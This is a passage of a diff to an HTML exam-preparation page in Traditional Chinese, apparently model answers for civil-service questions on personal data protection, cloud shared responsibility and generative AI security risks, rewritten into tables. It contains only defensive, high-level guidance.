-        　　　3. 可採 <strong>k-匿名</strong>、資料泛化（年齡改為年齡層、地址粗化至鄉鎮）<br>
-        　（三）<strong>小樣本揭露風險</strong>：某區僅 1～2 筆資料時，即使去識別化仍可能被指認 → 應設定<strong>最小揭露門檻</strong>或合併分組<br>
-        　（四）<strong>法規檢視</strong>：<br>
-        　　　1. 符合《<strong>政府資訊公開法</strong>》，確認非屬豁免公開事由（涉個人隱私、國家機密、營業秘密）<br>
-        　　　2. 符合《<strong>個人資料保護法</strong>》之目的外利用規定<br>
-        　（五）<strong>作業程序</strong>：建立資料開放審查機制（業務單位、法制、資訊單位共同審查）、明確權責<br>
-        　（六）<strong>資料品質與格式</strong>：採<strong>機器可讀</strong>格式（CSV、JSON、API）、提供<strong>後設資料（Metadata）</strong>與資料字典、標示更新頻率與授權條款（如政府資料開放授權條款）<br>
-        　（七）<strong>持續管理</strong>：定期檢視已開放資料集之風險、建立問題回報與下架機制<br><br>
-        <strong>四、結論</strong>：個資保護與資料加值運用並非對立——透過<strong>適當之去識別化與風險評估</strong>，可在保障當事人權益的前提下促進資料開放。惟機關應建立<strong>制度化的審查流程</strong>，而非僅依承辦人個別判斷。
+        <div class="frame"><span class="t">📋 答題骨架</span>
+        一、個資法主要規範（表）→ 二、技術措施（<u>主表，分七類</u>）→ 三、開放資料注意事項（表，含<u>三層風險</u>）
         </div>
-        <strong>💡 拿分關鍵</strong>：第三小題的「<strong>間接識別與交叉比對重新識別</strong>」與「<strong>小樣本揭露風險</strong>」是關鍵區分點——只寫「把姓名拿掉」是不夠的。另外「測試環境不得使用真實個資」也是很少人寫但很實務的一點。
+
+        <strong>📊 一、《個人資料保護法》主要規範</strong>
+        <div class="table-wrap"><table>
+          <tr><th>面向</th><th>規範重點</th></tr>
+          <tr><td><strong>① 個資之定義</strong></td><td>自然人之姓名、身分證字號、聯絡方式、特徵、社會活動等<strong>得以直接或間接方式識別該個人</strong>之資料</td></tr>
+          <tr><td><strong>② 特種個資</strong></td><td><strong>病歷、醫療、基因、性生活、健康檢查、犯罪前科</strong>——原則<strong>不得蒐集處理利用</strong>，例外情形從嚴</td></tr>
+          <tr><td><strong>③ 蒐集之要件</strong></td><td>公務機關須有<strong>執行法定職務必要範圍</strong>等法定事由，且與<strong>特定目的</strong>有相當關聯</td></tr>
+          <tr><td><strong>④ 告知義務</strong></td><td>蒐集時應告知：<strong>機關名稱、蒐集目的、個資類別、利用之期間／地區／對象／方式、當事人權利、不提供之影響</strong></td></tr>
+          <tr><td><strong>⑤ 利用之限制</strong></td><td>原則應於<strong>蒐集之特定目的必要範圍內</strong>利用；<strong>目的外利用</strong>須符合法定例外事由</td></tr>
+          <tr><td><strong>⑥ 當事人權利</strong></td><td><strong>查詢、請求閱覽、製給複製本、補充或更正、停止蒐集處理利用、刪除</strong>——且<strong>不得預先拋棄或以特約限制</strong></td></tr>
+          <tr><td><strong>⑦ 安全維護義務</strong></td><td>公務機關應指定專人辦理安全維護事項，採行<strong>適當之技術與組織措施</strong>防止個資被竊取、竄改、毀損、滅失或洩漏</td></tr>
+          <tr><td><strong>⑧ 外洩通知</strong></td><td>個資遭違反本法之情事時，應<strong>查明後以適當方式通知當事人</strong></td></tr>
+          <tr><td><strong>⑨ 責任</strong></td><td>公務機關違法致當事人受損害者<strong>負損害賠償責任</strong>；並有行政與刑事責任規定</td></tr>
+        </table></div>
+        <p style="font-size:.88rem"><strong>作答提醒</strong>：條號不必強記，<strong>把「特定目的」「必要範圍」「告知義務」「安全維護措施」「通知當事人」這幾個關鍵詞寫對即可拿分</strong>。</p>
+
+        <strong>📊 二、技術措施（主表）</strong>
+        <div class="table-wrap"><table>
+          <tr><th>類別</th><th>措施</th><th>說明</th></tr>
+          <tr><td rowspan="2"><strong>① 加密</strong></td><td><strong>傳輸加密</strong></td><td>全站 <strong>TLS 1.2 以上</strong>；內部系統間傳輸亦應加密</td></tr>
+          <tr><td><strong>儲存加密</strong></td><td>資料庫加密（TDE）或<strong>欄位層級加密</strong>；<strong>金鑰與資料分離保管</strong>，並建立金鑰輪替機制</td></tr>
+          <tr><td><strong>② 密碼保護</strong></td><td><strong>慢速雜湊＋隨機鹽</strong></td><td>bcrypt／Argon2；<u>絕不可明文或可逆加密儲存</u>；搭配 <strong>MFA</strong></td></tr>
+          <tr><td rowspan="3"><strong>③ 去識別化</strong></td><td><strong>最小化蒐集</strong></td><td><strong>非必要不蒐集、不留存</strong>——這是成本最低、效果最好的一招</td></tr>
+          <tr><td><strong>遮罩</strong>（Masking）</td><td>畫面與報表顯示 <code>A12****89</code>、<code>王○明</code>；<strong>依角色決定可見程度</strong></td></tr>
+          <tr><td><strong>匿名化／假名化</strong></td><td>統計分析用途應移除或以代號取代識別欄位；<u>假名化仍屬個資，匿名化才脫離個資法適用</u></td></tr>
+          <tr><td rowspan="3"><strong>④ 存取控制</strong></td><td><strong>RBAC ＋最小權限</strong></td><td>依職務授權；<strong>定期權限複核</strong>；<strong>離職即停用</strong></td></tr>
+          <tr><td><strong>以檢視表限制欄位</strong></td><td>只授權 View、<strong>收回底層表權限</strong></td></tr>
+          <tr><td>特殊作業控管</td><td>大量查詢、批次匯出須<strong>事前核准與雙人覆核</strong>；限制可匯出筆數</td></tr>
+          <tr><td rowspan="2"><strong>⑤ 稽核軌跡</strong></td><td><strong>完整記錄</strong></td><td>記錄<strong>誰、何時、查了誰的、做了什麼</strong>；<strong>日誌不可被查詢者自行刪改</strong></td></tr>
+          <tr><td>異常偵測</td><td>非上班時間查詢、短時間大量查詢、查詢非承辦案件 → <strong>自動告警</strong></td></tr>
+          <tr><td rowspan="2"><strong>⑥ 環境管理</strong></td><td><strong>環境分離</strong></td><td>開發／測試／正式分離；<strong>測試環境不得使用真實個資</strong>（須以假資料或去識別化資料）</td></tr>
+          <tr><td>設備管控</td><td>端點加密、USB 管控、<strong>DLP</strong>；設備報廢須<strong>資料徹底清除</strong></td></tr>
+          <tr><td><strong>⑦ 生命週期</strong></td><td><strong>保存與銷毀</strong></td><td>訂定<strong>保存年限</strong>，屆期依規定銷毀；<strong>備份媒體同受管控</strong>（<u>常被遺忘的漏洞</u>）</td></tr>
+        </table></div>
+
+        <strong>📊 三、開放資料（Open Data）注意事項</strong>
+        <div class="table-wrap"><table>
+          <tr><th>風險層次</th><th>問題</th><th>對策</th></tr>
+          <tr><td><strong>① 直接識別</strong></td><td>資料中含姓名、身分證字號、電話</td><td><strong>一律移除</strong></td></tr>
+          <tr><td><strong>② 小樣本揭露</strong></td><td>某里<strong>僅 1～2 筆</strong>低收入戶 → 鄰里間即可指認出當事人</td><td>設定<strong>最小揭露門檻</strong>（如少於 N 筆即不揭露或合併分組）</td></tr>
+          <tr><td><strong>③ 間接識別</strong></td><td>「出生年月日＋性別＋郵遞區號」<u>組合起來即可能鎖定個人</u></td><td><strong>準識別欄位須泛化</strong>：年齡改年齡層、日期改月份、地址改至區級</td></tr>
+          <tr><td><strong>④ 交叉比對重新識別</strong></td><td>與其他公開資料集比對後還原身分</td><td>發布前進行<strong>重新識別風險評估</strong>；必要時採 k-匿名等技術</td></tr>
+        </table></div>
+        <div class="table-wrap"><table>
+          <tr><th>其他應注意事項</th><th>說明</th></tr>
+          <tr><td><strong>法規檢視</strong></td><td>確認無<strong>個資法、營業秘密、國家機密</strong>或其他法令限制公開之情形；符合《政府資訊公開法》</td></tr>
+          <tr><td><strong>資料品質</strong></td><td>正確、完整、<strong>定期更新</strong>；標示<strong>資料時點與更新頻率</strong>——<u>過期資料比沒有資料更糟</u></td></tr>
+          <tr><td><strong>格式與可用性</strong></td><td>採<strong>機器可讀</strong>的開放格式（CSV、JSON、XML），避免只提供 PDF；提供<strong>資料字典</strong>說明欄位定義</td></tr>
+          <tr><td><strong>授權條款</strong></td><td>明訂<strong>政府資料開放授權條款</strong>，說明可否商業利用與需否標示出處</td></tr>
+          <tr><td>持續管理</td><td>建立<strong>下架與更正機制</strong>；設置意見回饋窗口；定期檢視是否仍適合開放</td></tr>
+          <tr><td>內部程序</td><td>建立<strong>開放前審查機制</strong>（業務單位＋政風／法制＋資訊單位共同審查），並留存審查紀錄</td></tr>
+        </table></div>
+
+        <div class="hl"><span class="t">✍️ 必寫拿分點</span>
+        1. 個資法要寫出<strong>「特定目的」「必要範圍」「告知義務」「安全維護措施」「通知當事人」</strong>五個關鍵詞<br>
+        2. <strong>特種個資</strong>要列舉並說明原則禁止<br>
+        3. 技術措施<strong>至少分五類</strong>，且要具體（不能只寫「加密」，要寫傳輸／儲存、金鑰分離保管）<br>
+        4. <strong>「非必要不蒐集」是最有效的個資保護</strong>——高分句<br>
+        5. <strong>「測試環境不得使用真實個資」</strong>與<strong>「日誌不可被查詢者自行刪改」</strong>是實務性加分<br>
+        6. 開放資料<strong>務必寫「小樣本揭露」與「間接識別（準識別欄位組合）」</strong>——這兩點是本小題的核心鑑別點<br>
+        7. 補上<strong>機器可讀格式</strong>、<strong>標示資料時點</strong>、<strong>開放前審查機制</strong>
+        </div>
       </div>
     </details>
   </div>
@@ -1496,61 +1874,77 @@
     </div>
     <details><summary>看答題架構</summary>
       <div class="ans">
-        <div class="frame"><span class="t">建議結構</span>
-        <strong>一、雲端服務與部署模式</strong><br>
-        　（一）<strong>服務模式</strong>（NIST 定義）：<br>
-        　　　‧ <strong>IaaS</strong>：提供運算、儲存、網路等基礎資源（如虛擬機）<br>
-        　　　‧ <strong>PaaS</strong>：提供開發與執行平台（作業系統、資料庫、中介軟體）<br>
-        　　　‧ <strong>SaaS</strong>：直接提供應用軟體服務（如郵件、文件協作）<br>
-        　　　‧ 比喻：<strong>IaaS 如租地自建、PaaS 如租毛胚屋裝潢、SaaS 如住旅館</strong><br>
-        　（二）<strong>部署模式</strong>：<br>
-        　　　‧ <strong>公有雲</strong>：成本低、彈性大，但資料在他人環境<br>
-        　　　‧ <strong>私有雲</strong>：專屬使用、可控性高，但成本與維運負擔重<br>
-        　　　‧ <strong>社群雲</strong>：特定社群共用（如政府共用雲）<br>
-        　　　‧ <strong>混合雲</strong>：兼採，敏感資料留私有雲、彈性需求用公有雲<br>
-        　（三）雲端五大特徵：隨需自助服務、廣泛網路存取、資源池化、快速彈性、可計量服務<br><br>
-        <strong>二、責任共擔模式</strong><br>
-        　（一）核心概念：安全責任由雲端業者與客戶<strong>分擔</strong>，範圍隨服務模式而異<br>
-        <div class="table-wrap"><table>
-          <tr><th>層級</th><th>IaaS</th><th>PaaS</th><th>SaaS</th></tr>
-          <tr><td>實體設施／機房</td><td>業者</td><td>業者</td><td>業者</td></tr>
-          <tr><td>虛擬化層</td><td>業者</td><td>業者</td><td>業者</td></tr>
-          <tr><td>作業系統</td><td><strong>客戶</strong></td><td>業者</td><td>業者</td></tr>
-          <tr><td>中介軟體／執行環境</td><td><strong>客戶</strong></td><td>業者</td><td>業者</td></tr>
-          <tr><td>應用程式</td><td><strong>客戶</strong></td><td><strong>客戶</strong></td><td>業者</td></tr>
-          <tr><td><strong>資料</strong></td><td><strong>客戶</strong></td><td><strong>客戶</strong></td><td><strong>客戶</strong></td></tr>
-          <tr><td><strong>身分與存取管理</strong></td><td><strong>客戶</strong></td><td><strong>客戶</strong></td><td><strong>客戶</strong></td></tr>
-        </table></div>
-        　（二）<strong>關鍵結論</strong>：<u>不論何種模式，「資料」與「存取權限設定」永遠是客戶的責任。</u><br>
-        　（三）實務印證：多數雲端外洩事件並非業者被駭，而是<strong>客戶組態錯誤</strong>（儲存空間設為公開、權限過寬、金鑰誤上傳至程式碼倉庫）<br>
-        　（四）因應：<strong>CSPM</strong>（雲端安全態勢管理）持續掃描錯誤組態；建立雲端資源標準組態範本<br><br>
-        <strong>三、機關上雲之資安與法遵考量</strong><br>
-        　（一）<strong>法規遵循</strong>：<br>
-        　　　1. 依《<strong>資通安全管理法</strong>》，委外仍須確保受託者符合資安要求，並納入監督<br>
-        　　　2. 依《<strong>個人資料保護法</strong>》，個資之委託處理須<strong>盡監督義務</strong>並簽訂契約載明<br>
-        　　　3. <strong>資料主權與跨境傳輸</strong>：確認資料存放地點，敏感或法定不得出境之資料須留存境內<br>
-        　　　4. 依《<strong>政府採購法</strong>》辦理，並注意雲端服務按量計費與預算編列之配合<br>
-        　　　5. 確認業者是否符合政府相關雲端服務資安要求或通過相關驗證<br>
-        　（二）<strong>資料分級</strong>：先完成<strong>資料分類分級</strong>，決定哪些系統與資料適合上雲；機敏系統可採私有雲或混合雲<br>
-        　（三）<strong>技術控管</strong>：<br>
-        　　　1. <strong>IAM 最小權限</strong>、禁用根帳號日常作業、全面 MFA<br>
-        　　　2. <strong>加密</strong>：傳輸與靜態皆加密；評估<strong>自管金鑰（BYOK／CMK）</strong>以保留控制權<br>
-        　　　3. <strong>日誌與監控</strong>：啟用完整稽核日誌並匯入機關 SIEM<br>
-        　　　4. 網路隔離：虛擬私有網路、安全群組、必要時專線連接<br>
-        　　　5. 備份：<strong>不可僅依賴雲端業者</strong>，應有獨立備份（跨帳號或落地）<br>
-        　（四）<strong>契約與服務管理</strong>：<br>
-        　　　1. <strong>SLA</strong>：可用性、效能、支援回應時間與違約責任<br>
-        　　　2. <strong>資安事件通報義務</strong>與配合調查之責任<br>
-        　　　3. <strong>稽核權</strong>：得要求提供第三方稽核報告<br>
-        　　　4. <strong>資料可攜與退場機制</strong>：契約終止時資料<strong>完整取回並確實刪除</strong><br>
-        　（五）<strong>風險考量</strong>：<br>
-        　　　1. <strong>供應商鎖定（Vendor Lock-in）</strong>：盡量採標準化技術，降低移轉成本<br>
-        　　　2. <strong>服務中斷</strong>：評估單一雲風險，關鍵服務考慮多可用區或多雲<br>
-        　　　3. <strong>成本失控</strong>：建立用量監控與預算告警<br>
-        　　　4. <strong>人員能力</strong>：雲端維運技能與傳統機房不同，須及早培訓<br><br>
-        <strong>四、結論</strong>：上雲並非把責任外包——機關仍須就<strong>資料與存取管理</strong>負最終責任。建議先完成資料分級，採<strong>分階段、由低敏感系統先行</strong>之策略，並以契約與監督機制落實法遵要求。
+        <div class="frame"><span class="t">📋 答題骨架</span>
+        一、三服務模式＋四部署模式（表）→ 二、責任共擔<u>對照表</u> → 三、資安與法遵考量（表，分「法遵／資安／營運／採購」）
         </div>
-        <strong>💡 拿分關鍵</strong>：責任共擔的<strong>表格</strong>是本題核心，最後兩列（資料、身分存取管理）全部都是客戶責任，一定要標出來。「退場機制與資料可攜」是很多人漏掉但契約上極重要的一點。
+
+        <strong>📊 一、服務模式與部署模式</strong>
+        <div class="table-wrap"><table>
+          <tr><th>服務模式</th><th>提供內容</th><th>客戶管理範圍</th><th>例子</th></tr>
+          <tr><td><strong>IaaS</strong><br>基礎設施即服務</td><td>虛擬機、儲存、網路</td><td><strong>作業系統以上全部</strong></td><td>虛擬主機、雲端儲存</td></tr>
+          <tr><td><strong>PaaS</strong><br>平台即服務</td><td>作業系統、執行環境、資料庫服務</td><td><strong>應用程式與資料</strong></td><td>應用服務平台、託管資料庫</td></tr>
+          <tr><td><strong>SaaS</strong><br>軟體即服務</td><td>完整應用軟體</td><td><strong>僅資料與使用者權限</strong></td><td>雲端郵件、線上文件、視訊會議</td></tr>
+        </table></div>
+        <div class="table-wrap"><table>
+          <tr><th>部署模式</th><th>說明</th><th>適用</th></tr>
+          <tr><td><strong>公有雲</strong></td><td>由雲端業者提供，多租戶共用</td><td>彈性大、成本低；<u>資料主權與法遵須審慎評估</u></td></tr>
+          <tr><td><strong>私有雲</strong></td><td>專供單一組織使用</td><td><strong>敏感業務</strong>；控制權高但成本與維運負擔大</td></tr>
+          <tr><td><strong>社群雲</strong></td><td>由具共同需求之組織共享</td><td><strong>政府共構雲</strong>——多機關共用，兼顧成本與管控</td></tr>
+          <tr><td><strong>混合雲</strong></td><td>公有＋私有結合，資料與應用可跨越</td><td><strong>機關最常見的務實選擇</strong>：<u>敏感資料留內部，對外服務或尖峰運算放公有雲</u></td></tr>
+        </table></div>
+
+        <strong>📊 二、責任共擔模式</strong>
+        <div class="frame">
+          <span class="t">📐 核心觀念</span>
+          <strong>「雲端業者負責『雲的安全』（Security OF the Cloud）；客戶負責『雲中的安全』（Security IN the Cloud）。」</strong><br><br>
+          <strong>最重要的一句：責任可以委外，但「責任歸屬」不能委外。</strong><br>
+          機關仍是<strong>個資的蒐集者與管理者</strong>，發生外洩時<u>對民眾負責的仍是機關本身</u>。
+        </div>
+        <div class="table-wrap"><table>
+          <tr><th>層次</th><th>自建機房</th><th>IaaS</th><th>PaaS</th><th>SaaS</th></tr>
+          <tr><td><strong>資料與內容</strong></td><td>客戶</td><td><strong>客戶</strong></td><td><strong>客戶</strong></td><td><strong>客戶</strong></td></tr>
+          <tr><td><strong>身分與存取管理</strong></td><td>客戶</td><td><strong>客戶</strong></td><td><strong>客戶</strong></td><td><strong>客戶</strong></td></tr>
+          <tr><td>應用程式</td><td>客戶</td><td><strong>客戶</strong></td><td><strong>客戶</strong></td><td>業者</td></tr>
+          <tr><td>作業系統與中介軟體</td><td>客戶</td><td><strong>客戶</strong></td><td>業者</td><td>業者</td></tr>
+          <tr><td>虛擬化層</td><td>客戶</td><td>業者</td><td>業者</td><td>業者</td></tr>
+          <tr><td>實體主機與網路</td><td>客戶</td><td>業者</td><td>業者</td><td>業者</td></tr>
+          <tr><td>機房實體安全</td><td>客戶</td><td>業者</td><td>業者</td><td>業者</td></tr>
+        </table></div>
+        <div class="warn"><span class="t">⚠️ 客戶永遠要負責的三件事</span>
+        無論哪種服務模式，<strong>「資料」「身分與存取權限」「組態設定」永遠是客戶的責任</strong>。<br><br>
+        <strong>實務上絕大多數雲端資安事件都不是業者被駭，而是客戶的「組態設定錯誤」</strong>——例如<u>儲存空間誤設為公開讀取</u>、<u>管理介面對外開放</u>、<u>未啟用 MFA 的管理帳號外洩</u>。<u>寫出這一點是本題最高分的關鍵。</u></div>
+
+        <strong>📊 三、移轉公有雲之資安與法遵考量</strong>
+        <div class="table-wrap"><table>
+          <tr><th>面向</th><th>應考量事項</th></tr>
+          <tr><td rowspan="4"><strong>法遵</strong></td><td><strong>資料落地與主權</strong>——資料儲存位置是否在國內？是否受外國法律管轄？涉及國家機密或重要業務者應留在國內</td></tr>
+          <tr><td><strong>個資法</strong>——委外處理個資須<strong>監督受託者</strong>；<u>跨境傳輸須符合限制</u>；契約明定個資保護義務</td></tr>
+          <tr><td><strong>資通安全管理法</strong>——雲端服務納入<strong>資通安全維護計畫</strong>；系統分級後採對應防護基準；<strong>委外仍須監督受託者資安維護情形</strong></td></tr>
+          <tr><td>採購法規與相關規範——應符合政府採購與雲端服務相關作業規定；優先評估已通過安全評鑑之服務</td></tr>
+          <tr><td rowspan="5"><strong>資安</strong></td><td><strong>身分與存取</strong>——<strong>管理帳號一律 MFA</strong>；最小權限；避免使用最高權限帳號日常作業；<strong>定期輪替金鑰</strong></td></tr>
+          <tr><td><strong>組態管理</strong>——<u>最常見的事故來源</u>；應採<strong>組態基準檢核</strong>與自動化掃描，避免儲存空間或管理介面誤開放</td></tr>
+          <tr><td><strong>資料保護</strong>——傳輸與靜態加密；<strong>金鑰管理權責釐清</strong>（是否由機關自行保管金鑰）；備份策略與<strong>離線副本</strong></td></tr>
+          <tr><td><strong>日誌與監控</strong>——啟用完整稽核日誌並<strong>另存一份於機關可控之處</strong>；異常告警</td></tr>
+          <tr><td>網路——虛擬網路隔離、安全群組、<strong>不對外開放管理埠</strong>；必要時以專線或 VPN 連接</td></tr>
+          <tr><td rowspan="4"><strong>營運</strong></td><td><strong>可用性與 SLA</strong>——明定服務水準、<strong>故障賠償</strong>與通報義務；評估業者<strong>單一區域故障</strong>的影響</td></tr>
+          <tr><td><strong>廠商鎖定（Vendor Lock-in）</strong>——盡量採<strong>標準化技術與開放格式</strong>；避免深度綁定專有服務</td></tr>
+          <tr><td><strong>退場機制</strong>——契約應明定<strong>資料可攜、資料格式、移轉協助、終止後資料徹底刪除並提出證明</strong></td></tr>
+          <tr><td>成本——雲端非必然較便宜；須估算<strong>流量費用</strong>與長期總持有成本，並建立用量監控避免超支</td></tr>
+          <tr><td rowspan="3"><strong>採購與管理</strong></td><td><strong>契約條款</strong>——資安責任、事件通報時限、稽核權（<strong>機關得要求提供第三方稽核報告</strong>）、再委外之限制</td></tr>
+          <tr><td><strong>業者評估</strong>——是否具備 <strong>ISO 27001／27017／27018</strong> 等認證；財務穩健度與服務延續性</td></tr>
+          <tr><td>人員能力——雲端管理需要新技能，應規劃<strong>教育訓練</strong>；機關人力有限時評估託管服務</td></tr>
+        </table></div>
+        <div class="hl"><strong>建議結論</strong>：宜採<strong>混合雲</strong>策略——<strong>對外服務、非敏感業務與尖峰運算需求上公有雲</strong>；<strong>涉及個資、機密與核心業務之系統留在內部或政府共構雲</strong>。並宜<strong>擇一非關鍵系統先行試辦</strong>，累積經驗後再擴大。</div>
+
+        <div class="hl"><span class="t">✍️ 必寫拿分點</span>
+        1. 三服務模式要寫出<strong>客戶管理範圍的差異</strong>；四部署模式要含<strong>社群雲（政府共構雲）</strong><br>
+        2. 責任共擔的定義句<strong>「業者負責雲的安全、客戶負責雲中的安全」</strong>必寫<br>
+        3. <strong>責任對照表要畫</strong>（層次 × 四種模式）——本題主要配分<br>
+        4. <strong>「資料、身分權限、組態設定永遠是客戶責任」</strong>＋<strong>「多數事故源於組態錯誤」</strong>——最高分的兩句<br>
+        5. 強調<strong>「責任可以委外，責任歸屬不能委外」</strong><br>
+        6. 法遵務必寫<strong>資料落地與主權</strong>、<strong>個資法委外監督</strong>、<strong>資安法納入維護計畫</strong><br>
+        7. 結論建議<strong>混合雲＋先行試辦</strong>，並含<strong>退場機制與資料可攜</strong>
+        </div>
       </div>
     </details>
   </div>
@@ -1564,45 +1958,69 @@
     </div>
     <details><summary>看答題架構</summary>
       <div class="ans">
-        <div class="frame"><span class="t">建議結構</span>
-        <strong>一、生成式 AI 帶來的新型威脅</strong><br>
-        　（一）<strong>社交工程品質大幅提升</strong>：<br>
-        　　　1. 釣魚郵件文法通順、語氣可客製化，<u>傳統「文句怪異」的辨識方法失效</u><br>
-        　　　2. 可依公開資訊產生高度客製化之<strong>魚叉式釣魚</strong>內容<br>
-        　　　3. 可大量產製，降低攻擊成本<br>
-        　（二）<strong>深偽（Deepfake）</strong>：<br>
-        　　　1. 語音複製冒充首長或主管指示匯款、變更帳號（BEC 升級版）<br>
-        　　　2. 影像／視訊偽造，可用於詐騙或散布不實訊息<br>
-        　　　3. 對機關之衝擊：<strong>「聽到本人聲音」不再是可靠的身分確認方式</strong><br>
-        　（三）<strong>惡意程式開發門檻降低</strong>：協助撰寫、變形與混淆程式碼，規避特徵碼偵測<br>
-        　（四）<strong>漏洞挖掘自動化</strong>：加速對目標系統的弱點分析<br>
-        　（五）<strong>假訊息與輿論操作</strong>：大量生成內容，影響公共政策討論與機關聲譽<br><br>
-        <strong>二、AI 系統本身的資安風險</strong><br>
-        　（一）<strong>提示注入（Prompt Injection）</strong>：以特製輸入誘導模型忽略原有指令或洩漏系統提示；<u>間接注入</u>可藏於模型讀取的網頁或文件中<br>
-        　（二）<strong>資料洩漏</strong>：<br>
-        　　　1. 人員將<strong>公務機敏資料貼入公開 AI 服務</strong>，等同對外傳輸<br>
-        　　　2. 模型可能於回應中洩漏訓練資料<br>
-        　（三）<strong>訓練資料投毒（Data Poisoning）</strong>：污染訓練資料使模型產生偏誤或後門<br>
-        　（四）<strong>對抗式攻擊（Adversarial Example）</strong>：微幅擾動輸入使模型誤判（如影像辨識、惡意程式偵測）<br>
-        　（五）<strong>模型竊取／逆向</strong>：透過大量查詢重建模型或推斷訓練資料<br>
-        　（六）<strong>幻覺（Hallucination）</strong>：產生看似合理但錯誤之內容 → 若未經查核即用於公文或對外答覆，可能造成<strong>行政責任</strong><br>
-        　（七）<strong>偏見與歧視</strong>：影響決策公平性，於行政處分場域尤須注意<br>
-        　（八）<strong>供應鏈風險</strong>：使用來源不明之開源模型或套件<br><br>
-        <strong>三、機關導入之管理規範</strong><br>
-        　（一）<strong>使用範圍與資料分級</strong>：<br>
-        　　　1. 明定<strong>不得輸入</strong>之資料類型：個人資料、國家機密、未公開之公文與決策資料、系統帳密與組態<br>
-        　　　2. 依資料敏感度區分可使用之工具（公開服務 vs <strong>地端／私有部署</strong>）<br>
-        　（二）<strong>人工複核義務</strong>：AI 產出<strong>僅供輔助</strong>，對外文件與行政決定須經人員查核並由承辦人負責；不得以 AI 產出直接作為行政處分依據<br>
-        　（三）<strong>標示與透明</strong>：視情形標示 AI 協助產製，維持行政透明<br>
-        　（四）<strong>技術控管</strong>：企業版服務並關閉資料再訓練、記錄使用日誌、以 DLP 監控敏感資料外傳、限制可使用之服務清單<br>
-        　（五）<strong>身分確認程序強化</strong>：因應深偽，重要指示（如變更匯款帳號、調閱敏感資料）<strong>不得僅憑電話或語音確認</strong>，須以另一管道回撥或書面確認<br>
-        　（六）<strong>教育訓練</strong>：更新資安意識課程內容，納入深偽與 AI 釣魚之辨識與應對<br>
-        　（七）<strong>法遵</strong>：符合《個人資料保護法》《資通安全管理法》，並依<strong>行政院及主管機關訂定之生成式 AI 參考指引</strong>辦理<br>
-        　（八）<strong>採購與委外</strong>：於契約中要求廠商說明模型來源、資料處理方式與資安措施<br>
-        　（九）<strong>先導試辦</strong>：選定低風險應用（如公文草稿輔助、資料整理）先行試辦，評估後再擴大<br><br>
-        <strong>四、結論</strong>：生成式 AI 同時是<strong>工具與威脅</strong>。機關不宜因噎廢食而全面禁止，亦不可無管理地開放；應以<strong>資料分級</strong>界定使用範圍、以<strong>人工複核</strong>確保行政品質與責任歸屬，並同步更新資安防護與教育訓練，方能安全地取得效益。
+        <div class="frame"><span class="t">📋 答題骨架</span>
+        一、生成式 AI 帶來的新威脅（表）→ 二、AI 系統自身的風險（表）→ 三、機關管理規範（表，分「使用／資料／輸出／採購／教育」）
         </div>
-        <strong>💡 拿分關鍵</strong>：這是近年最容易出的新題型。第三小題的「<strong>明定不得輸入之資料類型</strong>」與「<strong>因應深偽而強化身分確認程序</strong>」是最具體、最有價值的兩點。結論的「不因噎廢食也不無管理開放」是很平衡的公務員視角。
+
+        <strong>📊 一、生成式 AI 帶來的新型威脅</strong>
+        <div class="table-wrap"><table>
+          <tr><th>威脅</th><th>說明</th><th>對機關的具體影響</th></tr>
+          <tr><td><strong>① 釣魚郵件品質大幅提升</strong></td><td>過去可靠「語句不通順」辨識，<strong>現在文法完美且能高度客製</strong></td><td><u>傳統的辨識教學失效</u>；冒充上級或同仁的郵件極難分辨</td></tr>
+          <tr><td><strong>② 深偽（Deepfake）</strong></td><td>可偽造<strong>語音與影像</strong>，門檻極低</td><td>冒充長官來電要求緊急匯款或變更帳號（<strong>BEC 詐騙</strong>）；<u>「聽到本人聲音」已不再是可靠的身分確認</u></td></tr>
+          <tr><td><strong>③ 惡意程式撰寫門檻降低</strong></td><td>不具技術能力者也能產生可用的攻擊腳本</td><td>攻擊者總數與攻擊頻率上升</td></tr>
+          <tr><td><strong>④ 自動化攻擊</strong></td><td>可自動生成大量變體以規避特徵碼偵測；自動分析漏洞</td><td>傳統特徵碼式防毒效果下降 → <strong>須改用行為式偵測（EDR）</strong></td></tr>
+          <tr><td><strong>⑤ 假訊息與輿論操縱</strong></td><td>可大量產製看似真實的內容</td><td>冒名發布不實政策訊息，損及機關公信力</td></tr>
+          <tr><td><strong>⑥ 個資與機密外洩（內部風險）</strong></td><td>員工<strong>將公務資料貼入公開 AI 服務</strong></td><td><u>資料可能被業者留存或用於訓練</u> → <strong>這是機關最真實、最常發生的風險</strong></td></tr>
+          <tr><td><strong>⑦ 社交工程精準化</strong></td><td>結合公開資訊自動產生高度個人化的話術</td><td>針對特定承辦人的鎖定式攻擊增加</td></tr>
+        </table></div>
+
+        <strong>📊 二、AI 系統本身面臨的資安風險</strong>
+        <div class="table-wrap"><table>
+          <tr><th>風險</th><th>原理</th><th>後果</th></tr>
+          <tr><td><strong>① 提示詞注入</strong><br>（Prompt Injection）</td><td>在輸入或<strong>外部文件中夾帶指令</strong>，誘使模型忽略原有規則</td><td>繞過限制、洩漏系統提示或機敏資訊；<u>AI 讀取的網頁或文件都可能是攻擊面</u></td></tr>
+          <tr><td><strong>② 資料投毒</strong><br>（Data Poisoning）</td><td>在訓練資料中植入惡意樣本</td><td>模型產生偏誤或被植入後門</td></tr>
+          <tr><td><strong>③ 對抗性樣本</strong></td><td>對輸入做人眼難察的細微擾動</td><td>使影像或語音辨識<strong>誤判</strong>（如門禁人臉辨識被繞過）</td></tr>
+          <tr><td><strong>④ 模型竊取／萃取</strong></td><td>大量查詢後重建近似模型</td><td>智慧財產損失</td></tr>
+          <tr><td><strong>⑤ 訓練資料還原</strong></td><td>誘導模型輸出訓練時記憶的內容</td><td><strong>個資或機密外洩</strong></td></tr>
+          <tr><td><strong>⑥ 幻覺</strong>（Hallucination）</td><td>模型會產生<strong>看似合理但錯誤</strong>的內容，且語氣同樣肯定</td><td><u>公文或法規引用錯誤而未被察覺</u> → <strong>對機關而言是最實際的風險</strong></td></tr>
+          <tr><td>⑦ 供應鏈風險</td><td>第三方模型、套件或外掛可能含惡意程式</td><td>整體系統遭入侵</td></tr>
+          <tr><td>⑧ 過度依賴與可用性</td><td>服務中斷或業者政策變更</td><td>業務中斷；<strong>缺乏可解釋性</strong>導致決策無法說明</td></tr>
+        </table></div>
+
+        <strong>📊 三、機關導入之管理規範</strong>
+        <div class="table-wrap"><table>
+          <tr><th>面向</th><th>應訂定之規範</th></tr>
+          <tr><td rowspan="3"><strong>① 使用範圍</strong></td><td>明定<strong>可使用與禁止使用</strong>的情形：<u>公文初稿、翻譯、摘要可用；涉及個資、機密、尚未公開之政策不得使用</u></td></tr>
